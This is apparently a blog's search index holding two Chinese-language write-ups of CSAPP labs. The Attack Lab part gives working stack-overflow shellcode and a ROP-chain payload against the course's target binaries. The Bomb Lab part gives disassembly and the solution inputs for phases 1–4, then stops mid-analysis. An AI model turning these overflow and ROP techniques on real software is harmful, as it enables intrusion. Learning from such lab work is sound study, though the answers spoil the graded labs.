<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSAPP Attack Lab Writeup</title>
    <url>/2021/01/17/CSAPP-Attack-Lab-Writeup/</url>
    <content><![CDATA[<p>今天顺带把attack lab做完了，算是小小地复习了下栈溢出和ROP吧。</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><del>最开始我甚至都不知道这个lab要怎么开始做起，跑都跑不起来</del></p>
<p><code>hex2raw</code>读入以空格作为分隔的一个个字节，编码成一个个机器码。就跟pwntools里面的u32、u64差不多的作用。不然直接输入是没有用的。</p>
<p>直接运行<code>ctarget</code>或<code>rtarget</code>会没办法运行，报了个<code>Running on an illegal host</code>的错误。</p>
<p>我们加个<code>-q</code>的参数就能跑了。或者<code>-i</code>然后加上文件名，从文件里读入。</p>
<p>运行的方法是这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;ctarget -q</span><br><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;rtarget -q</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="Part-1-Code-Injection-Attacks"><a href="#Part-1-Code-Injection-Attacks" class="headerlink" title="Part 1: Code Injection Attacks"></a>Part 1: Code Injection Attacks</h2><p>这部分主要是利用了栈溢出，虽然checksec查到了canary，但在那个<code>Gets</code>函数里面看看汇编其实是没有的。</p>
<p>同时栈内存可执行，这是Level 2跟3的伏笔。</p>
<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>最简单的<code>gets</code>函数溢出，只要用<code>touch1</code>的地址覆盖rbp就可以了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>第二个要求利用栈溢出调用<code>touch2</code>，同时携带一个int参数，要求值跟cookie一致。</p>
<p>可以直接ROP解决，而这里因为栈可执行，还有往栈里写shellcode的做法，做下记录。</p>
<p>构造shellcode当然先写汇编，有两种写法：</p>
<h4 id="已知cookie再写入"><a href="#已知cookie再写入" class="headerlink" title="已知cookie再写入"></a>已知cookie再写入</h4><p>在<code>cookie.txt</code>里面就有cookie的值，我们只要把这个值赋给rdi就可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>因为是AT&amp;T语法，所以可以直接用<code>gcc -c</code>编译出未链接文件，然后我们objdump一下就可以看到对应的shellcode了。</p>
<p><code>ret</code>命令相当于一个<code>pop rip</code>，将<code>rip</code>指向了<code>0x4017ec</code>，即调用了<code>touch2</code>。</p>
<p>但是直接写shellcode得能执行啊，怎么让它执行？把rbp的值写成shellcode在栈上的地址。</p>
<p>这里又有一个小细节：<strong>字符串在栈里面通过push写入的话要翻转顺序，而shellcode需要正序写入。</strong>前面要写hello world的shellcode，字符串是反向写入的，因为我们读字符串自然是从低地址到高地址的。而shellcode就直接写就完事了。</p>
<p>所以我们需要获取栈的地址。那我们用gdb调一调就可以找到字符串的地址了：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/level2.png">
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success2.png">
<h4 id="从程序中真正获取cookie的值"><a href="#从程序中真正获取cookie的值" class="headerlink" title="从程序中真正获取cookie的值"></a>从程序中真正获取cookie的值</h4><p>可以用汇编来获取地址的值，比如这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq $0x006044e4, %rdi</span><br><span class="line">movq (%rdi), %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>这样就算cookie是个随机数，也能跳转，比较普适。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 e4 44 60 00 48</span><br><span class="line">8b 3f 68 ec 17 40 00 c3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success22.png">
<p>Jan 17 upd：第二种shellcode的汇编也可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq 0x006044e4, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>mov和lea的区别，就是mov会做一次dereference，而lea只进行计算。</p>
<p>只要mov的src不是一个immediate（最前面有一个$号）而是一个地址，默认都会把src这个地址dereference之后的值赋给dest。而lea就只是单纯计算之后把结果赋给dest。</p>
<p>对寄存器的dereference，还是打一个括号。上述强调的是immediate和memory的一个区别。</p>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>第三个要求我们继续利用那个漏洞跳入<code>touch3</code>，顺便携带一个字符串地址，还要跑过<code>hexmatch</code>函数的检测。</p>
<p>我们在基于Level 2在栈上写shellcode的思想，再在栈上储存一个字符串，然后rdi就指向这个字符串的地址，这样才能控制。</p>
<p>我们知道cookie值是0x59b997fa，但是我们要的是字符串且没有起始的0x。</p>
<p>所以我们要弄到”59b997fa”这段字符串，实际上写入的时候就得写入ASCII码了。</p>
<p>但是不能随便在栈里面随便找个地方存，因为后面执行<code>hexmatch</code>时，会把部分栈上内容overwrite掉，所以可以找个保险的地方，直接存到rbp紧接着的地址。</p>
<p>shellcode部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x004018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>这里 解释一下：<code>0x5561dca8 = 0x5561dc78 + 0x28 + 0x8</code></p>
<p>把它翻译成机器码，粘在字符串里：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
<p>啊？前面不是说字符串要反过来嘛？怎么现在是正的？因为我们不是通过push来写入的。</p>
<p>众所周知，push进去的值是little endian储存的，所以字符串要反过来才是正确的顺序。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success3.png">
<h2 id="Part-2-Return-Oriented-Programming"><a href="#Part-2-Return-Oriented-Programming" class="headerlink" title="Part 2: Return-Oriented Programming"></a>Part 2: Return-Oriented Programming</h2><p>第二部分相比第一部分加上了很多保护：打开了ASLR，NX Enable，把前面在栈里面写shellcode的想法杀死了。现在就可以使用ROP了。</p>
<p><code>farm.c</code>中似乎是些没用的函数，不过当变成机器码并且截取一小部分时，会有意想不到的收货。这个在<code>attacklab.pdf</code>里写的很清楚。</p>
<p>而我们大可直接用ROPgadget来做。。。</p>
<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>用ROP来实现前面第二关的效果。直接用一个pop rdi的gadget就可以了。</p>
<p>略。</p>
<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>现在就是真正的拼gadget了。</p>
<p>这里有一个问题：因为还是必须在栈里面存字符串，那怎么获取地址？栈地址已经会变化了。</p>
<p>在看别人博客的时候，看见一个非常非常重要的gadget：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00000000004019d6 : lea rax, [rdi + rsi] ; ret</span><br></pre></td></tr></table></figure>
<p>只要其中一个是栈上的地址，我们控制另一个，就可以获得栈上任意处的地址。</p>
<p>开始扫gadget：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--only &quot;mov|ret&quot;</span><br><span class="line">0x0000000000401b23 : mov byte ptr [rax + 0x605500], 0 ; ret</span><br><span class="line">0x0000000000400f63 : mov byte ptr [rip + 0x20454e], 1 ; ret</span><br><span class="line">0x000000000040214e : mov dword ptr [rdi + 8], eax ; ret</span><br><span class="line">0x0000000000401b10 : mov dword ptr [rip + 0x2045ee], eax ; ret</span><br><span class="line">0x0000000000402dd7 : mov eax, 0 ; ret</span><br><span class="line">0x0000000000401994 : mov eax, 1 ; ret</span><br><span class="line">0x0000000000401a07 : mov eax, esp ; ret</span><br><span class="line">0x0000000000401a9a : mov eax, esp ; ret 0x8dc3</span><br><span class="line">0x00000000004019a3 : mov edi, eax ; ret</span><br><span class="line">0x000000000040214d : mov qword ptr [rdi + 8], rax ; ret</span><br><span class="line">0x0000000000401a06 : mov rax, rsp ; ret</span><br><span class="line">0x00000000004019a2 : mov rdi, rax ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--only &quot;pop|ret&quot;</span><br><span class="line">0x00000000004021d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000004018f5 : pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x00000000004011aa : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000401dab : pop rbx ; ret</span><br><span class="line">0x000000000040141b : pop rdi ; ret</span><br><span class="line">0x0000000000402b17 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000401383 : pop rsi ; ret</span><br><span class="line">0x0000000000402b13 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040137f : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000004021d8 : pop rsp ; pop r13 ; ret</span><br><span class="line">0x00000000004018f8 : pop rsp ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
<p>（略去了一部分没用的gadget）</p>
<p>我们可以先得到rsp的值，mov到rax，然后mov到rdi，这样rdi就拿到了栈顶的地址。</p>
<p>接下来通过pop rsi的gadget，我们再输入偏移，就可以通过前面的lea获取我们输入的字符串的地址。</p>
<p>最后mov到rdi上，就可以跳转到<code>touch3</code>了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">83 13 40 00 00 00 00 00</span><br><span class="line">40 00 00 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP Bomb Lab Writeup</title>
    <url>/2021/01/13/CSAPP-Bomb-Lab-Writeup/</url>
    <content><![CDATA[<p>这是CSAPP的bomblab，对打pwn的新手补补基础还是非常有用的，尤其是各种汇编操作和IDA Pro里各种各样的奇妙语法，更是让我这个菜鸡大开眼界（还能这么坑……）</p>
<p>前五关非常的常规，我们通过汇编跟反汇编都看一下。</p>
<p>第六关我不行了，就通过反汇编的C代码走一走。</p>
<p>做了一个晚上加半个早上，终于搞定了，是我太菜……</p>
<a id="more"></a>
<h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h2><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>其中0x402400这个地址很奇妙，我们用gdb跟进去看一看：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase1.png">
<p>这里的<code>test</code>跟<code>je</code>两个汇编语句是连接在一起的，一般就像是这样用的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test %rax, %rax</span><br><span class="line">je 0x??????</span><br></pre></td></tr></table></figure>
<p><code>test</code>语句本质就是一个<code>and</code>，不过用<code>test</code>的话不会去改变%rax的值，而会直接放到下面来进行比较。</p>
<p>这两句汇编的意思就是%rax值等于0时就跳转，否则不跳转，执行下一条命令。</p>
<p>就是比较字符串相等就可以进入下一步了。</p>
<p>所以只需要保证输入的字符串是<code>&quot;Border relations with Canada have never been better.&quot;</code>，就可以了。</p>
<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase1(IDA).png">
<p>用IDA的话一眼看出来，就不用分析了。</p>
<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h2><h3 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>按照汇编来分析，stack frame的构造如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04(rbp)</span><br><span class="line">0x08      rbp</span><br><span class="line">0x1c          [5]</span><br><span class="line">0x10          [4]</span><br><span class="line">0x14          [3]</span><br><span class="line">0x18          [2]</span><br><span class="line">0x1c          [1] &lt;- rbx</span><br><span class="line">0x20 rsp  rsi [0] &lt;- rax</span><br></pre></td></tr></table></figure>
<p>在从<code>rsp - 0x20</code>到<code>rsp - 0x08</code>遍历的过程中，rax永远在栈上比rbx的地址小个4，也就是一个<code>int</code>的位置。每次check之后依次往后移一位。</p>
<p>我们需要满足的是两倍的rax等于rbx，也就是我们输入的数列是成倍增长的。</p>
<p>还有一个条件：读入到<code>rsp - 0x20</code>，也就是第一个数字，必须是1。</p>
<p>所以最终的输入就是<code>1 2 4 8 16 32</code>。</p>
<h3 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase2(IDA).png">
<p>输入六个整数，需要符合里面的这个规则：<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">2</span> * *((_DWORD *)v2 - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)v2 != (_DWORD)result )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  v2 += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v2 != v5);</span><br></pre></td></tr></table></figure><br>这里需要注意：在第三行的代码里，<code>v2</code>先被强制类型转换为<code>DWORD*</code>，然后再执行减1的操作。</p>
<p>因为<code>v2</code>的指针类型在减1之前已经确定，所以实际上<code>*((_DWORD *)v2 - 1)</code>就相当于<code>*(_DWORD *)(v2 - 4)</code>，也就是数组里面的上一个元素。</p>
<p>所以六个整数，只需要满足后一个是前一个的两倍，就可以了。</p>
<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h2><h3 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h3><p>非常简单，switch里面提供了8个配套选择，任选一个即可过关。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase3(IDA).png">
<h3 id="汇编-2"><a href="#汇编-2" class="headerlink" title="汇编"></a>汇编</h3><p>然而这个关卡的话看汇编会比较难看出来。这也是这一关的价值所在。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>stack frame大概长这样：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04</span><br><span class="line">0x08</span><br><span class="line">0x0c rcx [1]</span><br><span class="line">0x10 rdx [0]</span><br><span class="line">0x14</span><br><span class="line">0x18 rsp</span><br></pre></td></tr></table></figure><br>发现了第一个奇妙地址0x4025cf，我们也用gdb看看：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase3_disass.png">
<p>害……</p>
<p>不过这里有另一个奇妙地址，其实这句话就是switch汇编实现的核心：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br></pre></td></tr></table></figure>
<p>穿插复习下括号里两个数字和三个数字的表示法：</p>
<ul>
<li>(a, b) = a + b</li>
<li>(a, b, c) = a + b * c</li>
</ul>
<p>这种括号的表示方法不只在lea指令里面能用，在其他指令里也能见到。</p>
<p>再查一查0x402470这个地址的值，还有后面几个地址的值：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase3_switch.png">
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) p&#x2F;x *0x402470</span><br><span class="line">$9 &#x3D; 0x400f7c</span><br><span class="line">(gdb) p&#x2F;x *0x402478</span><br><span class="line">$10 &#x3D; 0x400fb9</span><br><span class="line">(gdb) p&#x2F;x *0x402480</span><br><span class="line">$11 &#x3D; 0x400f83</span><br><span class="line">(gdb) p&#x2F;x *0x402488</span><br><span class="line">$12 &#x3D; 0x400f8a</span><br><span class="line">(gdb) p&#x2F;x *0x402490</span><br><span class="line">$13 &#x3D; 0x400f91</span><br><span class="line">(gdb) p&#x2F;x *0x402498</span><br><span class="line">$14 &#x3D; 0x400f98</span><br><span class="line">(gdb) p&#x2F;x *0x4024a0</span><br><span class="line">$15 &#x3D; 0x400f9f</span><br><span class="line">(gdb) p&#x2F;x *0x4024a8</span><br><span class="line">$16 &#x3D; 0x400fa6</span><br><span class="line">(gdb) p&#x2F;x *0x4024b0</span><br><span class="line">$17 &#x3D; 0x7564616d</span><br></pre></td></tr></table></figure>
<p>可以发现，从0x402470开始储存的是一个指针数组，因为是64位，所以地址自然是8个字节8个字节间隔的。</p>
<p>并且，这个数组里的指针指向的值，都是<code>phase_3</code>函数的mov指令，即对应了switch语句中的不同分支。</p>
<blockquote>
<p>说句题外话，之所以switch中每个case的最后一般都得加一个<code>break</code>，就是因为在底层就是这样实现的。如果不加<code>break</code>，在每一句执行后就不会<code>jmp</code>出这个switch的判断，在这里就可能%eax被多次赋值。所以该加<code>break</code>还是得加的哦！</p>
</blockquote>
<p>一一对应后，可以梳理出能够通过的8个输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: 0xcf</span><br><span class="line">1: 0x137</span><br><span class="line">2: 0x2c3</span><br><span class="line">3: 0x100</span><br><span class="line">4: 0x185</span><br><span class="line">5: 0xce</span><br><span class="line">6: 0x2aa</span><br><span class="line">7: 0x147</span><br></pre></td></tr></table></figure>
<p>任选其一，就能通过第三关。</p>
<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase 4"></a>phase 4</h2><h3 id="IDA-3"><a href="#IDA-3" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase4(IDA).png">
<p>这个部分我们需要保证第一个读入的整数<code>v3</code>小于等于14的同时，<code>func4(v3, 0, 14)</code>也等于0，第二个读入的整数<code>v4</code>也要等于0。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/func4(IDA).png">
<p>而要使这个函数的返回值为0，只需要让<code>a1 = v3 = (14 - 0) / 2 + 0 = 7</code>。</p>
<h3 id="汇编-3"><a href="#汇编-3" class="headerlink" title="汇编"></a>汇编</h3><p>然而汇编并不像IDA反汇编出来的这样清晰，这一关一眼看上去可能眼花，认真看就好了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>栈布局是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04</span><br><span class="line">0x08</span><br><span class="line">0x0c rcx [1]</span><br><span class="line">0x10 rdx [0]</span><br><span class="line">0x14</span><br><span class="line">0x18 rsp</span><br></pre></td></tr></table></figure>
<p>在这里需要满足的有：</p>
<ul>
<li><code>0xe &gt;= *(rsp + 0x8)</code></li>
<li><code>0x0 == *(rsp + 0xc)</code></li>
<li><code>func4(*(rsp + 0x8), 0, 0xe) == 0</code></li>
</ul>
<p>我们进入<code>func4</code>看看汇编：</p>
